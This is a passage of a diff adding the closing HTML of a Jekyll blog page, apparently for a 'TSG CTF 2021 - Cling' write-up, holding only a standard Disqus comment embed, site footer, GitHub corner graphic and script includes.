+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/tsg-cling';
+        var disqus_title = 'TSG CTF 2021 - Cling';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/tsg-cling';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
